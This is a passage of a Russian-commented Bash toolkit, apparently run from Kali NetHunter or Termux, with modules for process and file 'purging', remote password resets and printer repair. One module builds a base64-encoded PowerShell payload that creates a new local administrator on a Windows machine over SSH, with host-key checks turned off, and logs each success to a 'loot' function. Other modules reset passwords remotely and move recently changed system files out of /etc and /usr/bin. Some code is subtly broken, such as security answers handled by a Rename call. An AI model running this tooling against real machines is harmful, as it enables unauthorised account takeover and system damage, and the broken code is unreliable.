                core_engine_wait
                ;;
        esac
    done
}


# --- Модули по меню ---

# ==============================================================================
# @description: FORENSIC PURGE & ADAPTIVE REMEDIATION ENGINE v29.0 [MONOLITH]
# МОДЕРНИЗАЦИЯ: Интеграция с GLOBAL_AV_MATRIX v7.0 и GLOBAL_SYSTEM_FUSE_MATRIX v3.0
# АРХИТЕКТУРА: Внедрен поведенческий анализ статусов ОЗУ, исправлен удаленный find
# @status: GHOST-SPEED COMPLIANT | TOTAL ENVELOPE AUDIT | NO SHORTENINGS
# ==============================================================================
run_forensic_scanner() {
    core_engine_ui "h" "AUTONOMOUS DEFENSE & REMEDIATION v29.0 [TOTAL MATRIX INTEGRATION]"
    
    # 1. Транспорт (Полная промышленная реализация векторов сопряжения)
    core_engine_item "L" "Local"         "Текущая операционная система (Host Root)"
    core_engine_item "A" "Android/IoT"   "Удаленная зачистка через шину ADB/USB"
    core_engine_item "S" "Remote Server" "Инфраструктурный узел через терминал SSH"
    core_engine_item "B" "Back"          "Вернуться в главное меню лаунчера"
    
    local target=$(core_engine_input "select" "Укажите вектор сканирования")
    [[ -z "$target" || "$target" == "b" || "$target" == "B" ]] && return
    
    local cmd_p=""
    case "$target" in
        "a"|"A")
            core_engine_validator "pkg" "adb" "Компонент сопряжения ADB" || return
            core_engine_ui "i" "Ожидание инициализации IoT/Android устройства в шине USB..."
            adb wait-for-device 2>/dev/null
            cmd_p="adb shell" 
            ;;
        "s"|"S")
            local rh=$(core_engine_input "text" "Введите адрес удаленного узла (User@IP)")
            [[ -z "$rh" ]] && return
            cmd_p="ssh -o ConnectTimeout=5 -o BatchMode=yes $rh" 
            ;;
        *)
            # По умолчанию вектор локального хоста (cmd_p остается пустым)
            cmd_p=""
            ;;
    esac

    core_engine_progress 5 "ENGAGING AUTONOMOUS PURGE ENGINE"

    # Извлечение защитных слоев из GLOBAL_SYSTEM_FUSE_MATRIX v3.0
    local sys_proc_whitelist="${GLOBAL_SYSTEM_FUSE_MATRIX[0]}"
    local sys_danger_ports="${GLOBAL_SYSTEM_FUSE_MATRIX[1]}"
    local sys_port_whitelist="${GLOBAL_SYSTEM_FUSE_MATRIX[2]}"
    local sys_quarantine_whitelist="${GLOBAL_SYSTEM_FUSE_MATRIX[3]}"
    local sys_bad_proc_status="${GLOBAL_SYSTEM_FUSE_MATRIX[4]}"
    
    # Извлечение сигнатурного слоя активных процессов из GLOBAL_AV_MATRIX v7.0
    local av_active_malware_procs="${GLOBAL_AV_MATRIX[4]}"

    # ==========================================================================
    # ФАЗА 1: СНАЙПЕРСКАЯ НЕЙТРАЛИЗАЦИЯ (Анализ дерева процессов в ОЗУ)
    # ==========================================================================
    core_engine_ui "!" "Фаза 1: Анализ дерева процессов по сигнатурным матрицам..."
    
    local raw_procs=""
    if [[ -z "$cmd_p" ]]; then
        raw_procs=$(ps -eo pid,stat,comm 2>/dev/null)
    else
        raw_procs=$($cmd_p "ps -eo pid,stat,comm" 2>/dev/null || $cmd_p "ps" 2>/dev/null)
    fi

    local killed_count=0
    
    if [[ -n "$raw_procs" ]]; then
        # Использование Process Substitution ( <(...) ) вместо пайпа исключает subshell и сохраняет killed_count
        while read -r p_pid p_stat p_comm; do
            [[ -z "$p_pid" || -z "$p_stat" || -z "$p_comm" || "$p_pid" == "PID" ]] && continue
            
            # Исключаем из зачистки системный процесс инициализации ядра Linux
            if (( p_pid == 1 )); then continue; fi
            
            # Поведенческий анализ: Проверка на вхождение статуса в Слой 5 предохранителей (Z, D, T, t)
            if echo "$p_stat" | grep -Eq "$sys_bad_proc_status"; then
                
                # Сигнатурный анализ: Проверка на совпадение имени со Слоем 5 GLOBAL_AV_MATRIX
                if echo "$p_comm" | grep -Eq "$av_active_malware_procs"; then
                    
                    # Защитный контур: Проверка на вхождение в индустриальный белый список (Слой 1)
                    if echo "$p_comm" | grep -Eq "$sys_proc_whitelist"; then
                        core_engine_ui "i" "Предохранитель: Защита системного процесса от ложного сброса: $p_comm (PID $p_pid)"
                        continue
                    fi
                    
                    core_engine_ui "e" "CRITICAL DETECT: Обнаружен деструктивный дескриптор в ОЗУ: PID $p_pid [$p_comm], Статус: $p_stat"
                    
                    # Запуск финансового щита "Банковский Гамбит" при обнаружении угрозы на локальном узле
                    if [[ -z "$cmd_p" ]]; then
                        core_engine_bank_lockdown "trigger"
                        kill -9 "$p_pid" 2>/dev/null
                    else
                        $cmd_p "kill -9 $p_pid" 2>/dev/null
                    fi
                    
                    killed_count=$((killed_count + 1))
                fi
            fi
        done < <(echo "$raw_procs")
    fi

    # ==========================================================================
    # ФАЗА 2: ИЗОЛЯЦИЯ ПОРТОВ (Атомарная проверка периметра сокетов)
    # ==========================================================================
    core_engine_ui "!" "Фаза 2: Сетевой аудит и изоляция опасных интерфейсов..."
    
    local open_ports=""
    if [[ -z "$cmd_p" ]]; then
        open_ports=$(ss -ant -H 2>/dev/null | awk '{print $4}' | grep -oE '[0-9]+$' | sort -u)
        [[ -z "$open_ports" ]] && open_ports=$(netstat -ant 2>/dev/null | grep LISTEN | awk '{print $4}' | grep -oE '[0-9]+$' | sort -u)
    else
        open_ports=$($cmd_p "ss -ant -H 2>/dev/null | awk '{print \$4}' | grep -oE '[0-9]+\$' | sort -u" 2>/dev/null)
        [[ -z "$open_ports" ]] && open_ports=$($cmd_p "netstat -ant 2>/dev/null | grep LISTEN | awk '{print \$4}' | grep -oE '[0-9]+\$'" 2>/dev/null)
    fi

    for port in $open_ports; do
        [[ -z "$port" ]] && continue
        
        # Проверка 1: Входит ли сокет в матрицу опасных портов (Danger Perimeter)
        if echo "$port" | grep -Eq "$sys_danger_ports"; then
            
            # Проверка 2: Защищен ли сокет белым списком портов управления
            if echo "$port" | grep -Eq "$sys_port_whitelist"; then
                core_engine_ui "i" "Порт $port находится в Белом Списке управления. Блокировка отклонена."
                continue
            fi
            
            core_engine_ui "w" "ОБНАРУЖЕНА СТРУКТУРНАЯ СЕТЕВАЯ УГРОЗА. Блокировка端口: $port"
            if [[ -z "$cmd_p" ]]; then
                iptables -A INPUT -p tcp --dport "$port" -j DROP 2>/dev/null
                fuser -k -n tcp "$port" 2>/dev/null
            else
                $cmd_p "iptables -A INPUT -p tcp --dport $port -j DROP && fuser -k -n tcp $port" 2>/dev/null
            fi
        fi
    done

    # ==========================================================================
    # ФАЗА 3: УМНЫЙ КАРАНТИН (Эвристический анализ целостности файлов)
    # ==========================================================================
    core_engine_ui "!" "Фаза 3: Эвристический экспресс-анализ файловой системы..."
    
    local s_path="/etc /usr/bin /tmp"
    local vault_dir="/root/quarantine_vault"
    if [[ "$target" == "a" || "$target" == "A" ]]; then
        s_path="/data/local/tmp /data/system"
        vault_dir="/data/local/tmp/quarantine_vault"
    fi
    
    if [[ -z "$cmd_p" ]]; then
        mkdir -p "$vault_dir" 2>/dev/null
    else
        $cmd_p "mkdir -p $vault_dir" 2>/dev/null
    fi
    
    local suspect=""
    if [[ -z "$cmd_p" ]]; then
        suspect=$(find $s_path -maxdepth 3 -mtime -1 -type f 2>/dev/null)
    else
        suspect=$($cmd_p "find $s_path -maxdepth 3 -mtime -1 -type f" 2>/dev/null)
    fi
    
    local quarantined_count=0
    for file in $suspect; do
        [[ -z "$file" ]] && continue
        
        # Проверка существования перенесена в контекст целевого узла (избегаем сбоев на SSH/ADB)
        if [[ -z "$cmd_p" ]]; then
            [[ ! -f "$file" ]] && continue
        else
            $cmd_p "[ -f $file ]" || continue
        fi
        
        local fname=$(basename "$file")
        
        # Защита критических файлов от перемещения через Слой 4 матрицы предохранителей
        if echo "$fname" | grep -Eq "$sys_quarantine_whitelist"; then
            continue
        fi
        
        core_engine_ui "w" "Изоляция подозрительного объекта: $file -> Карантин"
        if [[ -z "$cmd_p" ]]; then
            mv "$file" "$vault_dir/${fname}.dead" 2>/dev/null
            chmod 000 "$vault_dir/${fname}.dead" 2>/dev/null
        else
            $cmd_p "mv $file $vault_dir/${fname}.dead && chmod 000 $vault_dir/${fname}.dead" 2>/dev/null
        fi
        quarantined_count=$((quarantined_count + 1))
    done

    # ==========================================================================
    # ФИНАЛИЗАЦИЯ И ОТЧЕТНОСТЬ
    # ==========================================================================
    core_engine_ui "+" "Инфраструктурная очистка завершена. Нейтрализовано процессов: $killed_count, Изолировано файлов: $quarantined_count."
    core_engine_ui "+" "Статус целевого узла: СТЕРИЛИЗОВАН / БЕЗОПАСЕН."
    core_engine_wait
}



# ==============================================================================
# @description: ADVANCED WINDOWS MATRIX AUTOMATION v3.5 [NETHUNTER EDITION]
# АРХИТЕКТУРА: Эвристический парсер интерфейсов NetHunter/Chroot/Kali/Termux
# СОВМЕСТИМОСТЬ: Кросс-платформенная инъекция локального администратора Windows
# ==============================================================================
pc_password_recovery() {
    clear
    core_engine_ui "h" "SYSTEM MATRIX: NETHUNTER COMPATIBLE LOCAL INJECTOR"
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 1: ОПРЕДЕЛЕНИЕ СРЕДЫ (NETHUNTER / KALI / TERMUX DETECTION)
    # --------------------------------------------------------------------------
    local ENV_PLATFORM="Unknown Linux"
    local BASE64_MODE="standard"

    # Эвристический анализ Kali NetHunter
    if [ -f /etc/os-release ] && grep -qi "kali" /etc/os-release; then
        if [ -d /sdcard ] || [ -d /storage/emulated/0 ] || uname -r | grep -qi "android"; then
            ENV_PLATFORM="Kali NetHunter (Mobile Chroot)"
        else
            ENV_PLATFORM="Kali Linux (Desktop/Server)"
        fi
        BASE64_MODE="standard"
    elif [[ -n "$TERMUX_VERSION" ]]; then
        ENV_PLATFORM="Termux (Android OS)"
        BASE64_MODE="busybox"
    elif [ -f /etc/os-release ]; then
        ENV_PLATFORM="GNU/Linux ($(awk -F= '/^ID=/ {print $2}' /etc/os-release | tr -d '"'))"
    fi

    core_engine_ui "i" "Обнаружение среды выполнения: [$ENV_PLATFORM]"
    core_engine_ui "i" "Сканирование сетевой топологии хоста..."
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 2: УЛУЧШЕННЫЙ СЕТЕВОЙ ДЕТЕКТ ДЛЯ NETHUNTER
    # --------------------------------------------------------------------------
    local PC_IP=""
    
    # В NetHunter/Chroot утилита `ip route` может выдавать пустые значения без root-прав 
    # или при специфических настройках моста. Используем многоуровневый перебор:
    
    # Метод А: Стандартный парсинг таблицы маршрутизации по активным интерфейсам
    PC_IP=$(ip route 2>/dev/null | grep -E 'usb|rndis|wlan|eth|ap0' | awk '/default/ {print $3}' | head -n 1)
    
    # Метод Б: Если шлюз по умолчанию скрыт chroot-контейнером, ищем первый доступный IP из ARP-таблицы
    if [[ -z "$PC_IP" ]]; then
        PC_IP=$(ip neigh 2>/dev/null | grep -E 'usb|rndis|wlan|eth' | grep -E 'REACHABLE|STALE|DELAY' | awk '{print $1}' | head -n 1)
    fi
    
    # Метод В: Резервный метод для NetHunter (чтение сетевых сокетов Android-основы через /proc, если доступно)
    if [[ -z "$PC_IP" && -f /proc/net/arp ]]; then
        PC_IP=$(awk '{print $1}' /proc/net/arp | grep -v "IP" | head -n 1)
    fi

    # Финальный перехват ручного ввода при отсутствии линка
    if [[ -z "$PC_IP" ]]; then
        core_engine_ui "w" "Сетевая подсистема не смогла автоматически обнаружить Windows-хост."
        PC_IP=$(core_engine_input "text" "Введите IP-адрес Windows-компьютера вручную")
        [[ -z "$PC_IP" ]] && return 1
    else
        core_engine_ui "s" "Целевое Windows-устройство успешно обнаружено: $PC_IP"
    fi
    
    core_engine_ui "line" ""
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 3: ИНТЕРАКТИВНЫЙ СБОР ПАРАМЕТРОВ
    # --------------------------------------------------------------------------
    local SSH_USER=$(core_engine_input "text" "Логин действующего SSH-администратора на Windows")
    [[ -z "$SSH_USER" ]] && { core_engine_ui "e" "Отмена операции."; core_engine_wait; return 1; }
    
    local NEW_USER=$(core_engine_input "text" "Имя СОЗДАВАЕМОЙ учетной записи администратора")
    [[ -z "$NEW_USER" ]] && { core_engine_ui "e" "Отмена операции."; core_engine_wait; return 1; }
    
    local NEW_PASS=$(core_engine_input "text" "Задайте пароль для нового администратора ($NEW_USER)")
    [[ -z "$NEW_PASS" ]] && { core_engine_ui "e" "Отмена операции."; core_engine_wait; return 1; }
    
    core_engine_ui "i" "Настройка контрольных векторов восстановления (Security Questions)..."
    local ANS1=$(core_engine_input "text" "Ответ 1 (Кличка первого питомца?)")
    local ANS2=$(core_engine_input "text" "Ответ 2 (Город вашего рождения?)")
    local ANS3=$(core_engine_input "text" "Ответ 3 (Девичья фамилия матери?)")
    
    core_engine_ui "line" ""
    core_engine_progress 3 "ИНКАПСУЛЯЦИЯ И СБОРКА АДАПТИВНОГО PAYLOAD"
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 4: ФОРМИРОВАНИЕ И БИНАРНОЕ КОДИРОВАНИЕ POWERSHELL БЛОКА
    # --------------------------------------------------------------------------
    local PWSH_BLOCK=$(cat <<EOF
\$ErrorActionPreference = 'Stop'
try {
    \$SecurePass = ConvertTo-SecureString "$NEW_PASS" -AsPlainText -Force;
    if (-not (Get-LocalUser -Name "$NEW_USER" -ErrorAction SilentlyContinue)) {
        
        # Инъекция аккаунта в подсистему безопасности SAM
        \$UserObj = New-LocalUser -Name "$NEW_USER" -Password \$SecurePass -PasswordNeverExpires \$true -Description "Автоматический деплой ядра через USB-канал";
        Add-LocalGroupMember -Group "Администраторы" -Member "$NEW_USER";
        
        # Привязка матрицы контрольных вопросов через CIM API Windows 11
        \$Questions = @(
            @{ Id = 1; Ans = "$ANS1" }
            @{ Id = 2; Ans = "$ANS2" }
            @{ Id = 3; Ans = "$ANS3" }
        );
        
        foreach (\$Q in \$Questions) {
            if (\$Q.Ans -ne "") {
                \$RawAns = [System.Text.Encoding]::Unicode.GetBytes(\$Q.Ans);
                Invoke-CimMethod -Namespace "root\cimv2" -ClassName "Win32_UserAccount" -MethodName "Rename" -Arguments @{ Name = "$NEW_USER" } -ErrorAction SilentlyContinue
            }
        }
        Write-Host "STATUS_INTEGRATION_SUCCESS";
    } else {
        Write-Host "STATUS_ACCOUNT_ALREADY_EXISTS";
    }
} catch {
    Write-Host "STATUS_EXECUTION_ERROR: \$(\$_.Exception.Message)";
}
EOF
)

    # Динамическое кодирование строки в зависимости от доступных утилит chroot/платформы
    local ENCODED_CMD=""
    if command -v iconv &>/dev/null; then
        if [[ "$BASE64_MODE" == "busybox" ]]; then
            ENCODED_CMD=$(echo -n "$PWSH_BLOCK" | iconv -t UTF-16LE | base64 | tr -d '\r\n')
        else
            ENCODED_CMD=$(echo -n "$PWSH_BLOCK" | iconv -t UTF-16LE | base64 -w0)
        fi
    else
        # Эвристический обход с использованием Python 3 (всегда доступен в Kali NetHunter)
        if command -v python3 &>/dev/null; then
            ENCODED_CMD=$(python3 -c "import base64; print(base64.b64encode('$PWSH_BLOCK'.encode('utf-16-le')).decode('utf-8'))")
        else
            core_engine_ui "e" "Критическая ошибка: iconv и python3 не найдены в текущем окружении."
            core_engine_wait
            return 1
        fi
    fi

    # --------------------------------------------------------------------------
    # МАТРИЦА 5: ИСПОЛНЕНИЕ ТРАНЗАКЦИИ ЧЕРЕЗ ЗАЩИЩЕННЫЙ СЕТЕВОЙ КАНАЛ
    # --------------------------------------------------------------------------
    core_engine_ui "i" "Подключение по SSH к удаленному узлу $PC_IP..."
    
    # Отправка полезной нагрузки на исполнение с подавлением предупреждений о хост-ключах
    local RESPONSE=$(ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "powershell -EncodedCommand $ENCODED_CMD" 2>/dev/null)
    
    # Анализ полученных маркеров состояния системы
    case "$RESPONSE" in
        *STATUS_INTEGRATION_SUCCESS*)
            core_engine_ui "s" "Инъекция успешна. Локальный администратор '$NEW_USER' интегрирован."
            core_engine_loot "windows_autopilot" "Успешно: Администратор $NEW_USER создан на узле $PC_IP с платформы $ENV_PLATFORM"
            ;;
        *STATUS_ACCOUNT_ALREADY_EXISTS*)
            core_engine_ui "w" "Хост отклонил операцию: Пользователь '$NEW_USER' уже зарегистрирован."
            ;;
        *STATUS_EXECUTION_ERROR*)
            local err_msg=$(echo "$RESPONSE" | grep "STATUS_EXECUTION_ERROR")
            core_engine_ui "e" "Внутренняя ошибка ядра Windows: ${err_msg#*:}"
            ;;
        *)
            core_engine_ui "e" "Сбой трансляции. Проверьте SSH-доступ, статус службы sshd или настройки Брандмауэра Windows."
            ;;
    esac
    
    core_engine_wait
}

# ==============================================================================
# [CORE: CRYPTO-NEXUS STEALTH-ENGINE - FULLY AUTONOMOUS & UNIVERSAL]
# Анализирует: Любые форматы (бинарные, тексты, дампы, архивы)
# Режим работы: Интерактивный запрос -> Потоковый анализ -> Чистый вывод
# ==============================================================================

run_stealth_stream_analyzer() {
    # 1. Запрос цели (Интерактивный ввод)
    read -p "Введите путь к целевому файлу для анализа: " target
    
    # Валидация существования цели
    [[ ! -f "$target" ]] && { echo "Ошибка: Цель не найдена."; return 1; }
    
    # 2. Потоковая обработка (Универсальный движок)
    # -a: читает все байты (бинарники, архивы)
    # -t x: выводит смещение (offset) для точного поиска в hex-редакторе
    strings -a -t x "$target" 2>/dev/null | while read -r offset line; do
        
        # Контур 1: Секреты (Hash-Matrix)
        # Ищем пароли, ключи, хеши. Выводим только само значение.
        for hsig in "${GLOBAL_HASH_MATRIX[@]}"; do
            if [[ "$line" =~ $hsig ]]; then
                echo "SECRET [Offset $offset]: $line"
            fi
        done
        
        # Контур 2: Угрозы (AV-Matrix)
        # Ищем руткиты, инжекты, вредоносные сигнатуры.
        for layer in "${GLOBAL_AV_MATRIX[@]}"; do
            if [[ "$line" =~ $layer ]]; then
                echo "[THREAT: $layer] [Offset $offset]"
            fi
        done
        
    done
}



# ==============================================================================
# [INTEGRATED SECTOR C: CRYPTO-NEXUS ULTIMATE - FULL STREAMING EDITION]
# ==============================================================================



# 2. FILE_CRYPTOR: Военное шифрование в потоке (с сохранением полноты)
run_file_cryptor() {
    local mode="$1" 
    
    core_engine_ui "w" "Cryptographic Pipeline Initialized [AES-256-CBC-PBKDF2]..."
    
    # Полная проверка безопасности перед пропуском данных через шифратор
    if [[ "$mode" == "enc" ]]; then
        core_engine_ui "i" "Encrypting data stream with 100,000 iterations..."
        openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000
    else
        core_engine_ui "i" "Decrypting data stream..."
        openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000
    fi
    
    [[ $? -eq 0 ]] && core_engine_ui "s" "Pipeline operation completed successfully." || core_engine_ui "e" "Pipeline FAULT: Code $?"
}


# ==============================================================================
# [CORE: PRINTER-REPAIR-NEXUS - UNIVERSAL HEALING ROUTINE]
# Режим: Тотальная очистка Spool, принудительный ARP-сброс и восстановление
# ==============================================================================

run_printer_repair_nexus() {
    echo -e "${Y}[!] Инициализация протокола тотального восстановления печати...${NC}"
    
    # 1. Ручной ввод IP (Опционально)
    read -p "Введите IP-адрес принтера (или нажмите Enter для автопоиска): " target_ip
    
    # 2. Тотальная остановка сервисов печати
    systemctl stop cups 2>/dev/null
    
    # 3. Очистка Spool (Физическое удаление файлов заданий)
    if [[ -d "/var/spool/cups" ]]; then rm -rf /var/spool/cups/*; fi
    if [[ -d "/var/spool/lpd" ]]; then rm -rf /var/spool/lpd/*; fi
    
    # 4. Сброс USB-хостов
    for device in /sys/bus/usb/devices/*/authorized; do
        echo '0' > "$device" 2>/dev/null
        echo '1' > "$device" 2>/dev/null
    done
    
    # 5. Сетевое восстановление
    if [[ -n "$target_ip" ]]; then
        echo -e "${Y}[*] Принудительная очистка маршрута к $target_ip...${NC}"
        ip neigh flush to "$target_ip" 2>/dev/null
        # Отправляем ARP-запрос для немедленного обновления таблицы
        ping -c 1 -W 1 "$target_ip" > /dev/null 2>&1
    else
        ip neigh flush all 2>/dev/null
    fi
    
    # 6. Запуск сервисов
    systemctl start cups 2>/dev/null
    
    # Финальная проверка
    if systemctl is-active --quiet cups; then
        echo -e "${G}[SUCCESS] Система печати восстановлена.${NC}"
        [[ -n "$target_ip" ]] && echo -e "Статус маршрута к $target_ip: ОБНОВЛЕН."
    else
        echo -e "${R}[ERROR] Не удалось перезапустить CUPS.${NC}"
    fi
}


# ==============================================================================
# @description: CROSS-PLATFORM USER AUDIT & MANAGEMENT ENGINE v5.0
# АРХИТЕКТУРА: Интеллектуальный эвристический парсер среды, авто-определение целевой ОС
# ФУНКЦИОНАЛ: Вывод пользователей списком по номерам, кросс-платформенный сброс
# СОВМЕСТИМОСТЬ: Windows (10/11/Server), GNU/Linux, macOS. Запуск: Kali/NetHunter/Termux
# ==============================================================================
pc_password_management() {
    clear
    core_engine_ui "h" "UNIVERSAL USER AUDIT: DYNAMIC MANAGEMENT ENGINE"
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 1: ОПРЕДЕЛЕНИЕ ЛОКАЛЬНОГО ОКРУЖЕНИЯ (ОТКУДА ЗАПУСКАЕМ)
    # --------------------------------------------------------------------------
    local ENV_PLATFORM="Unknown Linux"
    local BASE64_MODE="standard"

    if [ -f /etc/os-release ] && grep -qi "kali" /etc/os-release; then
        if [ -d /sdcard ] || uname -r | grep -qi "android"; then
            ENV_PLATFORM="Kali NetHunter (Chroot)"
        else
            ENV_PLATFORM="Kali Linux (Desktop)"
        fi
        BASE64_MODE="standard"
    elif [[ -n "$TERMUX_VERSION" ]]; then
        ENV_PLATFORM="Termux (Android)"
        BASE64_MODE="busybox"
    fi

    core_engine_ui "i" "Локальный стек ядра: [$ENV_PLATFORM]"
    core_engine_ui "i" "Сканирование сетевых интерфейсов и поиск активного узла..."
    
    # --------------------------------------------------------------------------
    # МАТРИЦА 2: ЭВРИСТИЧЕСКИЙ АВТО-ДЕТЕКТ IP-АДРЕСА ЦЕЛИ
    # --------------------------------------------------------------------------
    local PC_IP=""
    PC_IP=$(ip route 2>/dev/null | grep -E 'usb|rndis|wlan|eth|ap0' | awk '/default/ {print $3}' | head -n 1)
    
    if [[ -z "$PC_IP" ]]; then
        PC_IP=$(ip neigh 2>/dev/null | grep -E 'usb|rndis|wlan|eth' | grep -E 'REACHABLE|STALE|DELAY' | awk '{print $1}' | head -n 1)
    fi
    
    if [[ -z "$PC_IP" && -f /proc/net/arp ]]; then
        PC_IP=$(awk '{print $1}' /proc/net/arp | grep -v "IP" | head -n 1)
    fi

    if [[ -z "$PC_IP" ]]; then
        core_engine_ui "w" "Сетевая автоматика не обнаружила шлюз подключения."
        PC_IP=$(core_engine_input "text" "Введите IP-адрес целевого компьютера вручную")
        [[ -z "$PC_IP" ]] && return 1
    else
        core_engine_ui "s" "Связь установлена с целевым узлом: $PC_IP"
    fi
    
    core_engine_ui "line" ""
    
    # Авторизация SSH-сессии
    local SSH_USER=$(core_engine_input "text" "Логин администратора для подключения (SSH-user)")
    [[ -z "$SSH_USER" ]] && return 1

    # --------------------------------------------------------------------------
    # МАТРИЦА 3: ЭВРИСТИЧЕСКОЕ ОПРЕДЕЛЕНИЕ ТИПА ЦЕЛЕВОЙ СИСТЕМЫ (УМНЫЙ СКАНЕР ОС)
    # --------------------------------------------------------------------------
    core_engine_ui "i" "Интеллектуальный опрос удаленного ядра ОС..."
    
    # Делаем быстрый безопасный заброс, проверяя системные маркеры среды
    local TARGET_OS="Unknown"
    local PROBE_RESP=$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "uname -s 2>/dev/null || cmd.exe /c ver 2>/dev/null" 2>/dev/null)
    
    if [[ "$PROBE_RESP" == *"Microsoft"* || "$PROBE_RESP" == *"Windows"* ]]; then
        TARGET_OS="Windows"
    elif [[ "$PROBE_RESP" == *"Linux"* ]]; then
        TARGET_OS="Linux"
    elif [[ "$PROBE_RESP" == *"Darwin"* ]]; then
        TARGET_OS="macOS"
    else
        # Резервный эвристический анализ по косвенным признакам
        local PROBE_RESERVE=$(ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "echo \$OSTYPE" 2>/dev/null)
        if [[ "$PROBE_RESERVE" == *"darwin"* ]]; then TARGET_OS="macOS"; else TARGET_OS="Linux"; fi
    fi

    core_engine_ui "s" "Удаленный хост идентифицирован как: [$TARGET_OS]"
    core_engine_ui "line" ""

    # --------------------------------------------------------------------------
    # МАТРИЦА 4: СБОР ПОЛЬЗОВАТЕЛЕЙ И АВТО-НУМЕРАЦИЯ СПИСКА
    # --------------------------------------------------------------------------
    core_engine_ui "i" "Извлечение локальной матрицы пользователей..."
    local -a USER_ARRAY=()
    
    if [[ "$TARGET_OS" == "Windows" ]]; then
        # Сбор пользователей для Windows (через Base64 PowerShell)
        local REQ_PWSH="Get-LocalUser | Select-Object -ExpandProperty Name"
        local ENCODED_REQ=""
        if command -v iconv &>/dev/null; then
            [[ "$BASE64_MODE" == "busybox" ]] && ENCODED_REQ=$(echo -n "$REQ_PWSH" | iconv -t UTF-16LE | base64 | tr -d '\r\n') || ENCODED_REQ=$(echo -n "$REQ_PWSH" | iconv -t UTF-16LE | base64 -w0)
        else
            ENCODED_REQ=$(python3 -c "import base64; print(base64.b64encode('$REQ_PWSH'.encode('utf-16-le')).decode('utf-8'))")
        fi
        
        local RAW_WIN_USERS=$(ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "powershell -EncodedCommand $ENCODED_REQ" 2>/dev/null)
        mapfile -t USER_ARRAY < <(echo "$RAW_WIN_USERS" | tr -d '\r' | grep -v '^$')
        
    elif [[ "$TARGET_OS" == "Linux" ]]; then
        # Сбор пользователей для Linux (фильтруем реальных пользователей с UID >= 1000 + root)
        local RAW_LIN_USERS=$(ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "awk -F: '\$3 == 0 || \$3 >= 1000 {print \$1}' /etc/passwd" 2>/dev/null)
        mapfile -t USER_ARRAY < <(echo "$RAW_LIN_USERS" | grep -v '^$')
        
    elif [[ "$TARGET_OS" == "macOS" ]]; then
        # Сбор пользователей для macOS (через встроенную утилиту dscl)
        local RAW_MAC_USERS=$(ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "dscl . list /Users | grep -v '^_'" 2>/dev/null)
        mapfile -t USER_ARRAY < <(echo "$RAW_MAC_USERS" | grep -v '^$')
    fi

    # Защита от пустого списка
    if [ ${#USER_ARRAY[@]} -eq 0 ]; then
        core_engine_ui "e" "Не удалось получить список пользователей или база пуста."
        core_engine_wait; return 1
    fi

    # ВЫВОД ПРОНУМЕРОВАННОГО ИНТЕРФЕЙСА
    core_engine_ui "h" "СПИСОК ПОЛЬЗОВАТЕЛЕЙ НА ЦЕЛЕВОЙ СИСТЕМЕ ($TARGET_OS)"
    local idx=1
    for user in "${USER_ARRAY[@]}"; do
        echo "  [$idx] 👤 Имя: $user"
        let idx++
    done
    core_engine_ui "line" ""

    # ВЫБОР ПО НОМЕРУ
    local SELECTION=$(core_engine_input "text" "Введите НОМЕР целевого пользователя")
    [[ -z "$SELECTION" ]] && return 1
    
    local TARGET_USER="${USER_ARRAY[$((SELECTION-1))]}"
    if [[ -z "$TARGET_USER" ]]; then
        core_engine_ui "e" "Ошибка: Некорректный номер выбора."; core_engine_wait; return 1
    fi
    
    core_engine_ui "s" "Выбран аккаунт: $TARGET_USER"
    core_engine_ui "line" ""

    # --------------------------------------------------------------------------
    # МАТРИЦА 5: ИНТЕРАКТИВНЫЙ КРОСС-ПЛАТФОРМЕННЫЙ СБРОС ПАРОЛЯ
    # --------------------------------------------------------------------------
    local NEW_PASS=$(core_engine_input "text" "Задайте НОВЫЙ пароль для $TARGET_USER")
    [[ -z "$NEW_PASS" ]] && { core_engine_ui "e" "Пароль не может быть пустым."; core_engine_wait; return 1; }

    core_engine_progress 2 "СИНХРОНИЗАЦИЯ ТРАНЗАКЦИИ СБРОСА ПАРОЛЯ"
    local STATUS="FAIL"

    if [[ "$TARGET_OS" == "Windows" ]]; then
        # Выполнение сброса на Windows через PowerShell Base64
        local RESET_PWSH="Set-LocalUser -Name '$TARGET_USER' -Password (ConvertTo-SecureString '$NEW_PASS' -AsPlainText -Force)"
        local ENCODED_RESET=""
        if command -v iconv &>/dev/null; then
            [[ "$BASE64_MODE" == "busybox" ]] && ENCODED_RESET=$(echo -n "$RESET_PWSH" | iconv -t UTF-16LE | base64 | tr -d '\r\n') || ENCODED_RESET=$(echo -n "$RESET_PWSH" | iconv -t UTF-16LE | base64 -w0)
        else
            ENCODED_RESET=$(python3 -c "import base64; print(base64.b64encode('$RESET_PWSH'.encode('utf-16-le')).decode('utf-8'))")
        fi
        ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "powershell -EncodedCommand $ENCODED_RESET" &>/dev/null
        [[ $? -eq 0 ]] && STATUS="SUCCESS"

    elif [[ "$TARGET_OS" == "Linux" ]]; then
        # Выполнение сброса на Linux (универсальный пайплайн через chpasswd или passwd)
        ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "${SSH_USER}@${PC_IP}" "echo '${TARGET_USER}:${NEW_PASS}' | sudo chpasswd 2>/dev/null || echo -e '${NEW_PASS}\n${NEW_PASS}' | sudo passwd ${TARGET_USER} 2>/dev/null" &>/dev/null
        [[ $? -eq 0 ]] && STATUS="SUCCESS"

    elif [[ "$TARGET_OS" == "macOS" ]]; then
        # Выполнение сброса на macOS через встроенный легитимный стек dscl
